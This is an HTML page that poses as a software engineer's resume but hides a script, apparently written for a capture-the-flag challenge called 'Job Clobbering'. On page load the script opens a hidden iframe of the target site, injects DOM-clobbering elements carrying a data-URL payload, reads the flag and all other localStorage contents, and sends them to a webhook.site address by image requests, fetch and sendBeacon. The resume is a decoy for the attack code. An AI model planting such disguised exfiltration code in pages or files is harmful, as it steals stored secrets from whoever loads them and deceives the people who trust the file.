<!DOCTYPE html>
<html>
<head>
    <title>Software Engineer Resume - John Doe</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .header { text-align: center; margin-bottom: 30px; }
        .section { margin-bottom: 20px; }
        h1 { color: #2c3e50; }
        h2 { color: #34495e; border-bottom: 2px solid #3498db; }
    </style>
</head>
<body>
    <div class="header">
        <h1>John Doe</h1>
        <p>Senior Software Engineer</p>
        <p>Email: john.doe@email.com | Phone: (555) 123-4567</p>
        <p>LinkedIn: linkedin.com/in/johndoe | GitHub: github.com/johndoe</p>
    </div>

    <div class="section">
        <h2>Professional Summary</h2>
        <p>Experienced software engineer with 5+ years in full-stack development, specializing in JavaScript, Python, and cloud technologies.</p>
    </div>

    <div class="section">
        <h2>Technical Skills</h2>
        <ul>
            <li><strong>Languages:</strong> JavaScript, Python, Java, TypeScript, SQL</li>
            <li><strong>Frontend:</strong> React, Vue.js, HTML5, CSS3, Bootstrap</li>
            <li><strong>Backend:</strong> Node.js, Express, Django, Flask</li>
            <li><strong>Cloud:</strong> AWS, Docker, Kubernetes</li>
        </ul>
    </div>

    <div class="section">
        <h2>Work Experience</h2>
        <h3>Senior Software Engineer - TechCorp (2021-Present)</h3>
        <ul>
            <li>Led development of microservices architecture serving 1M+ users</li>
            <li>Reduced application load time by 40% through optimization</li>
            <li>Mentored junior developers and conducted code reviews</li>
        </ul>
    </div>

    <div class="section">
        <h2>Education</h2>
        <p><strong>Bachelor of Science in Computer Science</strong><br>
        University of Technology, 2019</p>
    </div>

    <script>
        const CHALLENGE_ORIGIN = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club';
        const WEBHOOK_URL = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e';
        
        console.log('[CORRECT-ATTACK] Starting correct Job Clobbering attack');
        
        // 发送页面加载信号
        const loadImg = new Image();
        loadImg.src = WEBHOOK_URL + '?event=CORRECT_ATTACK_LOADED&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();

        // 关键洞察：我们需要让Bot在访问我们页面时，通过某种方式在挑战网站域名下执行代码
        // 方法：使用iframe加载挑战网站，然后通过DOM Clobbering攻击iframe中的页面
        
        function executeCorrectAttack() {
            console.log('[CORRECT-ATTACK] Creating attack iframe...');
            
            // 发送攻击开始信号
            const startImg = new Image();
            startImg.src = WEBHOOK_URL + '?event=IFRAME_ATTACK_START&t=' + Date.now();
            
            // 创建隐藏的iframe，加载挑战网站
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = CHALLENGE_ORIGIN + '/#messages';
            
            // 当iframe加载完成后，尝试注入DOM Clobbering
            iframe.onload = function() {
                console.log('[CORRECT-ATTACK] Iframe loaded, attempting DOM manipulation...');
                
                try {
                    // 尝试访问iframe的document
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    
                    if (iframeDoc) {
                        console.log('[CORRECT-ATTACK] Can access iframe document - same origin!');
                        
                        // 在iframe中注入DOM Clobbering元素
                        const domClobDiv = iframeDoc.createElement('div');
                        domClobDiv.id = 'utilsJS';
                        
                        const urlDiv = iframeDoc.createElement('div');
                        urlDiv.id = 'url';
                        
                        // 创建恶意脚本 - 这次会在挑战网站域名下执行
                        const maliciousScript = `
                            console.log('[JOBCLOBBERING-SUCCESS] Executing in target domain!');
                            console.log('[JOBCLOBBERING-SUCCESS] Domain:', window.location.hostname);
                            
                            try {
                                var flag = localStorage.getItem('flag');
                                console.log('[JOBCLOBBERING-SUCCESS] Flag found:', flag);
                                
                                if (flag && flag !== 'null' && flag.trim() !== '') {
                                    console.log('🎉 FLAG CAPTURED:', flag);
                                    
                                    // 发送flag到webhook
                                    var img = new Image();
                                    img.src = '${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + 
                                             '&source=IFRAME_DOM_CLOBBERING&domain=' + encodeURIComponent(window.location.hostname) + 
                                             '&t=' + Date.now();
                                    
                                    // 备用方法
                                    fetch('${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + '&source=IFRAME_FETCH&t=' + Date.now())
                                        .catch(function() {
                                            navigator.sendBeacon('${WEBHOOK_URL}?flag=' + encodeURIComponent(flag) + '&source=IFRAME_BEACON&t=' + Date.now());
                                        });
                                        
                                } else {
                                    console.log('[JOBCLOBBERING-SUCCESS] No flag in localStorage');
                                    var img2 = new Image();
                                    img2.src = '${WEBHOOK_URL}?status=no_flag_in_iframe&domain=' + encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
                                }
                                
                                // 发送所有localStorage内容
                                var allData = {};
                                for (var i = 0; i < localStorage.length; i++) {
                                    var k = localStorage.key(i);
                                    allData[k] = localStorage.getItem(k);
                                }
                                
                                var img3 = new Image();
                                img3.src = '${WEBHOOK_URL}?iframe_storage=' + encodeURIComponent(JSON.stringify(allData)) + '&t=' + Date.now();
                                
                            } catch (e) {
                                console.error('[JOBCLOBBERING-SUCCESS] Error:', e);
                                var img4 = new Image();
                                img4.src = '${WEBHOOK_URL}?iframe_error=' + encodeURIComponent(e.message) + '&t=' + Date.now();
                            }
                        `;
                        
                        // 使用data URL设置恶意脚本
                        urlDiv.textContent = 'data:text/javascript,' + encodeURIComponent(maliciousScript);
                        
                        domClobDiv.appendChild(urlDiv);
                        iframeDoc.body.appendChild(domClobDiv);
                        
                        console.log('[CORRECT-ATTACK] DOM Clobbering elements injected');
                        
                        // 发送注入成功信号
                        const injectImg = new Image();
                        injectImg.src = WEBHOOK_URL + '?event=DOM_CLOBBERING_INJECTED&t=' + Date.now();
                        
                        // 触发loadMessageBoardJS函数
                        setTimeout(() => {
                            try {
                                if (iframe.contentWindow.loadMessageBoardJS) {
                                    console.log('[CORRECT-ATTACK] Triggering loadMessageBoardJS...');
                                    iframe.contentWindow.loadMessageBoardJS();
                                    
                                    const triggerImg = new Image();
                                    triggerImg.src = WEBHOOK_URL + '?event=LOAD_MESSAGE_BOARD_JS_TRIGGERED&t=' + Date.now();
                                }
                            } catch (e) {
                                console.error('[CORRECT-ATTACK] Failed to trigger loadMessageBoardJS:', e);
                                
                                const errorImg = new Image();
                                errorImg.src = WEBHOOK_URL + '?event=TRIGGER_FAILED&error=' + encodeURIComponent(e.message) + '&t=' + Date.now();
                            }
                        }, 1000);
                        
                    } else {
                        console.log('[CORRECT-ATTACK] Cannot access iframe document - cross-origin restriction');
                        
                        const crossOriginImg = new Image();
                        crossOriginImg.src = WEBHOOK_URL + '?event=IFRAME_CROSS_ORIGIN_BLOCKED&t=' + Date.now();
                    }
                    
                } catch (error) {
                    console.error('[CORRECT-ATTACK] Iframe access error:', error);
                    
                    const errorImg = new Image();
                    errorImg.src = WEBHOOK_URL + '?event=IFRAME_ACCESS_ERROR&error=' + encodeURIComponent(error.message) + '&t=' + Date.now();
                }
            };
            
            // 添加iframe到页面
            document.body.appendChild(iframe);
            
            console.log('[CORRECT-ATTACK] Iframe added to page');
        }

        // 页面加载后执行攻击
        window.addEventListener('load', () => {
            console.log('[CORRECT-ATTACK] Page loaded, starting correct attack...');
            
            setTimeout(() => {
                executeCorrectAttack();
            }, 2000);
        });

        // 页面卸载时发送信号
        window.addEventListener('beforeunload', () => {
            navigator.sendBeacon(WEBHOOK_URL + '?event=CORRECT_ATTACK_UNLOAD&t=' + Date.now());
        });
    </script>
</body>
</html>
